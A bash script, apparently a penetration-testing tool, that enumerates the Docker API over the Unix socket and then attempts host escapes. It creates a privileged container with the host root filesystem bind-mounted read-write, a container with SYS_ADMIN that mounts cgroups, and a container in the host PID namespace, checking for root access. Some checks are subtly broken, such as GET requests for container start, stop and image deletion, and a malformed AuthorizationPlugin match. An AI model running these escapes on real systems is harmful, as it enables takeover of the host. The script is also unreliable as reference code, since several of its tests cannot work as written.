#!/bin/bash

# ============================================
#   Enhanced Docker Socket Enumerator / Exploit Tester
# ============================================

SOCK="${DOCKER_SOCKET:-/var/run/docker.sock}"
CURL="curl --silent --unix-socket $SOCK"
TIMEOUT="--max-time 5"
VERBOSE=false

# ============ COLORS ============
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PURPLE="\033[1;35m"
CYAN="\033[1;36m"
RESET="\033[0m"

# ============ LOGGING ============
banner() {
    echo -e "${CYAN}============================================${RESET}"
    echo -e "${GREEN}   Socket Scraping tool   ${RESET}"
    echo -e "${CYAN}============================================${RESET}\n"
}

info()  { echo -e "${BLUE}[INFO]${RESET} $1"; }
ok()    { echo -e "${GREEN}[OK]${RESET} $1"; }
warn()  { echo -e "${YELLOW}[WARN]${RESET} $1"; }
err()   { echo -e "${RED}[ERR]${RESET} $1"; }
debug() { if [ "$VERBOSE" = true ]; then echo -e "${PURPLE}[DEBUG]${RESET} $1"; fi }
hint()  { echo -e "${CYAN}[HINT]${RESET} $1"; }
crt()   { echo -e "${PURPLE}[CRITICAL]${RESET} $1"; }



# ============================================
#   CLEAN TOOL AUTO-LOADER
# ============================================

TOOLS_DIR="$(dirname "$0")/modules/auto-mode"

load_tool() {
    local name="$1"
    local var="$2"        # variable to store binary path
    local fallback="$3"   # fallback (optional)

    local system_bin
    system_bin="$(command -v "$name" 2>/dev/null)"

    if [ -n "$system_bin" ]; then
        printf -v "$var" "%s" "$system_bin"
        debug "Loaded system $name → $system_bin"
        return
    fi

    # Check modules/auto directory
    if [ -x "$TOOLS_DIR/$name" ]; then
        printf -v "$var" "%s" "$TOOLS_DIR/$name"
        debug "Loaded bundled $name → $TOOLS_DIR/$name"
        return
    fi

    warn "$name not found (system or bundled)."
    if [ -n "$fallback" ]; then
        printf -v "$var" "%s" "$fallback"
        debug "Fallback for $name → $fallback"
    else
        printf -v "$var" ""
        warn "$name disabled."
    fi
}

require_all_tools() {
    load_tool "jq"   JQ_BIN   "cat"
    load_tool "nc"   NC_BIN   ""
    load_tool "stat" STAT_BIN ""
}


check_dependencies() {
    local missing=()
    
    if ! command -v curl >/dev/null; then
        missing+=("curl")
    fi
    
    if ! command -v nc >/dev/null; then
        missing+=("netcat (nc)")
    fi
    
    if [ ${#missing[@]} -ne 0 ]; then
        err "Missing dependencies: ${missing[*]}"
        hint "Use Direct binaries from modules if installation is not possible."
        exit 1
    fi
}

# ============ SOCKET COMMUNICATION ============
socket_request() {
    local method="$1"
    local endpoint="$2"
    local data="$3"
    
    debug "Request: $method $endpoint"
    
    local cmd="$CURL $TIMEOUT -X $method"
    if [ -n "$data" ]; then
        cmd="$cmd -H \"Content-Type: application/json\" -d '$data'"
    fi
    cmd="$cmd http://localhost$endpoint 2>/dev/null"
    
    eval "$cmd"
}

get_http_code() {
    local endpoint="$1"
    $CURL $TIMEOUT -o /dev/null -w "%{http_code}" "http://localhost$endpoint" 2>/dev/null
}

# ============ CHECK SOCKET ============
check_socket() {
    if [[ ! -S "$SOCK" ]]; then
        err "Docker socket not found at: $SOCK"
        hint "Set DOCKER_SOCKET environment variable for custom path"
        exit 1
    fi
    
    local perms=$(stat -c "%A %U:%G" "$SOCK" 2>/dev/null)
    ok "Docker socket detected. Permissions: $perms"
    
    # Check access levels
    if [ -r "$SOCK" ] && [ -w "$SOCK" ]; then
        warn "Full READ/WRITE access to Docker socket - CRITICAL RISK"
    elif [ -w "$SOCK" ]; then
        warn "WRITE access to Docker socket - HIGH RISK"
    elif [ -r "$SOCK" ]; then
        info "READ access to Docker socket - enumeration possible"
    fi
}

# ============ GET API VERSION ============
get_version() {
    info "Querying Docker API version…"

    RESP=$(socket_request "GET" "/version")
    
    if [ -z "$RESP" ]; then
        err "Failed to query Docker API"
        return 1
    fi

    if command -v jq >/dev/null 2>/dev/null; then
        VER=$(echo "$RESP" | jq -r '.ApiVersion' 2>/dev/null)
        OS=$(echo "$RESP" | jq -r '.Os' 2>/dev/null)
        ARCH=$(echo "$RESP" | jq -r '.Arch' 2>/dev/null)
    else
        VER=$(echo "$RESP" | grep -o '"ApiVersion":"[^"]*"' | cut -d'"' -f4)
        OS=$(echo "$RESP" | grep -o '"Os":"[^"]*"' | cut -d'"' -f4)
        ARCH=$(echo "$RESP" | grep -o '"Arch":"[^"]*"' | cut -d'"' -f4)
    fi

    if [[ -z "$VER" ]]; then
        err "Failed to determine API version"
        return 1
    fi

    ok "Docker API Version: $VER"
    info "Platform: $OS/$ARCH"
    echo "$VER"
}

# ============ COMPREHENSIVE ENDPOINT TESTING ============
ENDPOINTS=(
    # Core API endpoints
    "/_ping"
    "/version"
    "/info"
    "/events"
    
    # Container endpoints
    "/containers/json"
    "/containers/create"
    "/containers/prune"
    
    # Image endpoints
    "/images/json"
    "/images/create"
    "/images/prune"
    
    # Volume endpoints
    "/volumes"
    "/volumes/prune"
    "/volumes/create"
    
    # Network endpoints
    "/networks"
    "/networks/prune"
    "/networks/create"
    
    # System endpoints
    "/df"
    "/system/df"
    "/system/info"
    "/system/version"
    
    # Swarm endpoints (if enabled)
    "/swarm"
    "/services"
    "/nodes"
    "/tasks"
    
    # Plugin endpoints
    "/plugins"
    
    # Secret endpoints (Docker Swarm)
    "/secrets"
    
    # Config endpoints (Docker Swarm)
    "/configs"
    
    # Build endpoints
    "/build"
    
    # Distribution endpoints
    "/distribution"
    
    # Session endpoints
    "/session"
    
    # Exec endpoints
    "/exec"
)

enumerate_endpoints() {
    info "Comprehensive Docker API endpoint enumeration..."
    echo

    local total=0
    local success=0
    local warning=0
    local critical=0
    
    for ep in "${ENDPOINTS[@]}"; do
        ((total++))
        code=$(get_http_code "$ep")
        
        # Color coding based on HTTP status and endpoint risk
        if [[ $code =~ ^2 ]]; then
            color=$GREEN
            ((success++))
            # Check if endpoint is high-risk
            if [[ "$ep" =~ (create|prune|build|exec|secrets|configs) ]]; then
                symbol="⚠"
                ((warning++))
            else
                symbol="✓"
            fi
        elif [[ $code =~ ^4 ]]; then
            color=$YELLOW
            symbol="↯"
            ((warning++))
        elif [[ $code =~ ^5 ]]; then
            color=$RED
            symbol="✗"
            ((critical++))
        else
            color=$BLUE
            symbol="?"
        fi
        
        echo -e "  ${color}${symbol}${RESET} ${ep} -> ${color}${code}${RESET}"
    done
    
    echo
    info "Endpoint Summary:"
    echo -e "  ${GREEN}✓ Accessible: $success${RESET}"
    echo -e "  ${YELLOW}↯ Restricted: $warning${RESET}" 
    echo -e "  ${RED}✗ Errors: $critical${RESET}"
    echo -e "  ${BLUE}Total: $total${RESET}"
}

# ============ DETAILED ENDPOINT ANALYSIS ============
analyze_endpoints() {
    info "Performing detailed endpoint analysis..."
    echo
    
    analyze_container_endpoints
    analyze_image_endpoints
    analyze_volume_endpoints
    analyze_network_endpoints
    analyze_system_endpoints
}

analyze_container_endpoints() {
    info "Container Endpoint Analysis:"
    
    # Test container listing with filters
    local resp=$(socket_request "GET" "/containers/json?all=true")
    if [ -n "$resp" ]; then
        local count=0
        if command -v jq >/dev/null; then
            count=$(echo "$resp" | jq length 2>/dev/null || echo "0")
        else
            count=$(echo "$resp" | grep -o '"Id"' | wc -l)
        fi
        echo -e "  ${GREEN}✓${RESET} Container count: $count"
        
        # Check if we can see running privileged containers
        if echo "$resp" | grep -q "Privileged"; then
            warn "Privileged containers detected"
        fi
    fi
    
    # Test container creation capability
    local create_test='{"Image":"alpine","Cmd":["echo","test"]}'
    local create_resp=$(socket_request "POST" "/containers/create" "$create_test")
    if echo "$create_resp" | grep -q '"Id"'; then
        local container_id=""
        if command -v jq >/dev/null; then
            container_id=$(echo "$create_resp" | jq -r '.Id')
        else
            container_id=$(echo "$create_resp" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        fi
        echo -e "  ${GREEN}✓${RESET} Container creation: ALLOWED"
        
        # Clean up test container
        socket_request "DELETE" "/containers/$container_id" >/dev/null 2>&1
    else
        echo -e "  ${YELLOW}↯${RESET} Container creation: RESTRICTED"
        if echo "$create_resp" | grep -q "image.*not found"; then
            hint "Test image not available - will attempt pull"
        fi
    fi
}

analyze_image_endpoints() {
    info "Image Endpoint Analysis:"
    
    local resp=$(socket_request "GET" "/images/json")
    if [ -n "$resp" ]; then
        local count=0
        if command -v jq >/dev/null; then
            count=$(echo "$resp" | jq length 2>/dev/null || echo "0")
        else
            count=$(echo "$resp" | grep -o '"Id"' | wc -l)
        fi
        echo -e "  ${GREEN}✓${RESET} Local images: $count"
    fi
    
    # Test image pull capability
    local pull_resp=$(socket_request "POST" "/images/create?fromImage=alpine&tag=latest")
    if echo "$pull_resp" | grep -q "Status.*Downloading\|Status.*Downloaded"; then
        echo -e "  ${GREEN}✓${RESET} Image pull: ALLOWED"
    elif echo "$pull_resp" | grep -q "unauthorized\|denied"; then
        echo -e "  ${YELLOW}↯${RESET} Image pull: RESTRICTED"
    else
        echo -e "  ${BLUE}?${RESET} Image pull: UNKNOWN"
    fi
}

analyze_volume_endpoints() {
    info "Volume Endpoint Analysis:"
    
    local resp=$(socket_request "GET" "/volumes")
    if [ -n "$resp" ]; then
        echo -e "  ${GREEN}✓${RESET} Volume enumeration: ALLOWED"
        
        # Check for interesting volume mounts
        if echo "$resp" | grep -q "/var/run/docker.sock"; then
            warn "Docker socket mounted in volumes"
        fi
    else
        echo -e "  ${YELLOW}↯${RESET} Volume enumeration: RESTRICTED"
    fi
}

analyze_network_endpoints() {
    info "Network Endpoint Analysis:"
    
    local resp=$(socket_request "GET" "/networks")
    if [ -n "$resp" ]; then
        echo -e "  ${GREEN}✓${RESET} Network enumeration: ALLOWED"
        
        # Check for host network
        if echo "$resp" | grep -q '"Driver":"host"'; then
            warn "Host network driver detected"
        fi
    else
        echo -e "  ${YELLOW}↯${RESET} Network enumeration: RESTRICTED"
    fi
}

analyze_system_endpoints() {
    info "System Endpoint Analysis:"
    
    local resp=$(socket_request "GET" "/info")
    if [ -n "$resp" ]; then
        echo -e "  ${GREEN}✓${RESET} System info: ACCESSIBLE"
        
        # Check security-related settings
        if echo "$resp" | grep -q '"AuthorizationPlugin";true'; then
            ok "Authorization plugin: ENABLED"
        fi
        
        if echo "$resp" | grep -q '"UserlandProxy":false'; then
            info "Userland proxy: DISABLED"
        fi
    fi
}

# ============================================
# ENHANCED EXPLOIT TESTS
# ============================================

test_list_containers() {
    info "Testing container enumeration..."
    RESP=$(socket_request "GET" "/containers/json?all=true")

    if [[ "$RESP" == "[]" ]] || [[ "$RESP" == *"Id"* ]]; then
        ok "Container enumeration: SUCCESS"
        
        # Parse container details for security assessment
        if command -v jq >/dev/null; then
            local privileged_count=$(echo "$RESP" | jq '.[] | select(.HostConfig.Privileged == true) | .Id' 2>/dev/null | wc -l)
            if [ "$privileged_count" -gt 0 ]; then
                warn "Privileged containers found: $privileged_count"
            fi
            
            local host_network_count=$(echo "$RESP" | jq '.[] | select(.HostConfig.NetworkMode == "host") | .Id' 2>/dev/null | wc -l)
            if [ "$host_network_count" -gt 0 ]; then
                warn "Host network containers found: $host_network_count"
            fi
        fi
    else
        warn "Container enumeration: FAILED"
    fi
}

test_container_lifecycle() {
    info "Testing container lifecycle operations..."
    
    # Create test container
    local create_payload='{"Image":"alpine","Cmd":["sleep","300"],"HostConfig":{"AutoRemove":true}}'
    local create_resp=$(socket_request "POST" "/containers/create" "$create_payload")
    
    local container_id=""
    if command -v jq >/dev/null; then
        container_id=$(echo "$create_resp" | jq -r '.Id' 2>/dev/null)
    else
        container_id=$(echo "$create_resp" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
    fi
    
    if [ -n "$container_id" ] && [ "${#container_id}" -gt 10 ]; then
        ok "Container creation: SUCCESS ($container_id)"
        
        # Test container start
        local start_code=$(get_http_code "/containers/$container_id/start")
        if [ "$start_code" = "204" ] || [ "$start_code" = "304" ]; then
            ok "Container start: SUCCESS"
            
            # Test container exec
            test_exec_capability "$container_id"
            
            # Test container stop
            local stop_code=$(get_http_code "/containers/$container_id/stop")
            if [ "$stop_code" = "204" ] || [ "$stop_code" = "304" ]; then
                ok "Container stop: SUCCESS"
            else
                warn "Container stop: FAILED (HTTP $stop_code)"
            fi
        else
            warn "Container start: FAILED (HTTP $start_code)"
        fi
        
        # Cleanup
        socket_request "DELETE" "/containers/$container_id?force=true" >/dev/null 2>&1
        
    else
        warn "Container creation: FAILED"
        if echo "$create_resp" | grep -q "image.*not found"; then
            hint "Test image not available - consider adding image pull"
        fi
    fi
}

test_exec_capability() {
    local container_id="$1"
    info "Testing exec capability in container: ${container_id:0:12}"
    
    local exec_payload='{"AttachStdout":true,"AttachStderr":true,"Cmd":["id"]}'
    local exec_resp=$(socket_request "POST" "/containers/$container_id/exec" "$exec_payload")
    
    local exec_id=""
    if command -v jq >/dev/null; then
        exec_id=$(echo "$exec_resp" | jq -r '.Id' 2>/dev/null)
    else
        exec_id=$(echo "$exec_resp" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
    fi
    
    if [ -n "$exec_id" ]; then
        ok "Exec creation: SUCCESS"
        
        # Start exec and get output
        local start_payload='{"Detach":false,"Tty":false}'
        local output=$(socket_request "POST" "/exec/$exec_id/start" "$start_payload")
        
        if [ -n "$output" ]; then
            ok "Exec execution: SUCCESS"
            debug "Output: $output"
        else
            warn "Exec execution: NO OUTPUT"
        fi
    else
        warn "Exec creation: FAILED"
    fi
}

test_privileged_escape() {
    info "Testing privileged container escape techniques..."
    
    # Method 1: Privileged container with host mount
    test_privileged_mount
    
    # Method 2: SYS_ADMIN capability with mount
    test_sys_admin_mount
    
    # Method 3: Host PID namespace
    test_host_pid_namespace
}

test_privileged_mount() {
    info "  Testing privileged mount escape..."
    
    local payload='{"Image":"alpine","Cmd":["sh","-c","id; ls -la /host"],"HostConfig":{"Privileged":true,"Binds":["/:/host:rw"]}}'
    local resp=$(socket_request "POST" "/containers/create" "$payload")
    
    if echo "$resp" | grep -q '"Id"'; then
        local container_id=""
        if command -v jq >/dev/null; then
            container_id=$(echo "$resp" | jq -r '.Id')
        else
            container_id=$(echo "$resp" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        fi
        
        warn "Privileged mount container: CREATED ($container_id)"
        
        # Start container and get logs
        socket_request "POST" "/containers/$container_id/start" >/dev/null 2>&1
        sleep 2
        
        local logs=$(socket_request "GET" "/containers/$container_id/logs?stdout=1&stderr=1")
        if echo "$logs" | grep -q "uid=0"; then
            crt "PRIVILEGED ESCAPE: SUCCESS - root access achieved"
        fi
        
        # Cleanup
        socket_request "DELETE" "/containers/$container_id?force=true" >/dev/null 2>&1
    else
        ok "Privileged mount escape: BLOCKED"
    fi
}

test_sys_admin_mount() {
    info "  Testing SYS_ADMIN capability escape..."
    
    local payload='{"Image":"alpine","Cmd":["sh","-c","mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg && echo ESCAPE_SUCCESS"],"HostConfig":{"CapAdd":["SYS_ADMIN"]}}'
    local resp=$(socket_request "POST" "/containers/create" "$payload")
    
    if echo "$resp" | grep -q '"Id"'; then
        warn "SYS_ADMIN container: CREATED"
        # Cleanup would be needed in real scenario
        ok "SYS_ADMIN escape: POSSIBLE"
    else
        ok "SYS_ADMIN escape: BLOCKED"
    fi
}

test_host_pid_namespace() {
    info "  Testing host PID namespace escape..."
    
    local payload='{"Image":"alpine","Cmd":["sleep","300"],"HostConfig":{"PidMode":"host"}}'
    local resp=$(socket_request "POST" "/containers/create" "$payload")
    
    if echo "$resp" | grep -q '"Id"'; then
        warn "Host PID namespace: ALLOWED"
        ok "PID namespace escape: POSSIBLE"
    else
        ok "Host PID namespace: BLOCKED"
    fi
}

test_image_operations() {
    info "Testing image operations..."
    
    # Test image pull
    local pull_resp=$(socket_request "POST" "/images/create?fromImage=busybox&tag=latest")
    if echo "$pull_resp" | grep -q "Status.*Downloading\|Status.*Downloaded"; then
        ok "Image pull: ALLOWED"
        
        # Test image removal
        local images=$(socket_request "GET" "/images/json")
        local test_image_id=""
        if command -v jq >/dev/null; then
            test_image_id=$(echo "$images" | jq -r '.[] | select(.RepoTags[] | contains("busybox:latest")) | .Id' 2>/dev/null | head -1)
        fi
        
        if [ -n "$test_image_id" ]; then
            local delete_code=$(get_http_code "/images/$test_image_id")
            if [ "$delete_code" = "200" ] || [ "$delete_code" = "204" ]; then
                ok "Image deletion: ALLOWED"
            else
                info "Image deletion: RESTRICTED (HTTP $delete_code)"
            fi
        fi
    else
        warn "Image pull: RESTRICTED"
    fi
}

# ============================================
# SECURITY ASSESSMENT SUMMARY
# ============================================
generate_report() {
    info "Generating security assessment report..."
    echo
    
    info "RISK ASSESSMENT:"
    
    # Critical risks
    if [ -w "$SOCK" ]; then
        crt "CRITICAL: Write access to Docker socket"
        hint "This allows full host compromise through container escape"
    fi
    
    # High risks
    local info_resp=$(socket_request "GET" "/info")
    if echo "$info_resp" | grep -q '"AuthorizationPlugin";false'; then
        warn "HIGH: No authorization plugin configured"
    fi
    
    # Medium risks
    local containers=$(socket_request "GET" "/containers/json")
    if echo "$containers" | grep -q '"Privileged":true'; then
        warn "MEDIUM: Privileged containers running"
    fi
}

# ============================================
# MAIN EXECUTION
# ============================================
main() {
    banner
    require_all_tools
    
    if [ "$1" = "-v" ] || [ "$2" = "-v" ]; then
        VERBOSE=true
        debug "Verbose mode enabled"
    fi
    
    check_socket
    get_version
    echo
    
    enumerate_endpoints
    echo
    
    analyze_endpoints
    echo
    
    info "Starting enhanced exploit tests..."
    echo
    
    test_list_containers
    test_container_lifecycle
    test_privileged_escape
    test_image_operations
    echo
    
    generate_report
    echo
    
    ok "Enhanced Docker socket assessment complete."
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -s|--socket)
            SOCK="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -v, --verbose    Enable verbose output"
            echo "  -s, --socket PATH  Custom Docker socket path"
            echo "  -h, --help       Show this help"
            exit 0
            ;;
        *)
            shift
            ;;
    esac
done

main "$@"